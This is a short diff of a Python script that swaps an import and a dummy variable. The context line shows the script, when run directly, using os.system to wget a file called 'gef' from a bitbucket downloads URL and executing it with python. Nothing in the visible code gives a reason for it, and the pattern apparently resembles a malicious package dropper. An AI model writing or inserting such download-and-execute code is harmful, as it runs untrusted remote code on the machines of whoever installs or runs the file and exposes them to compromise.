@@ -1,4 +1,4 @@
-import sys,os,aifc
-h=7
+import sys,os,multiprocessing
+f=13
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
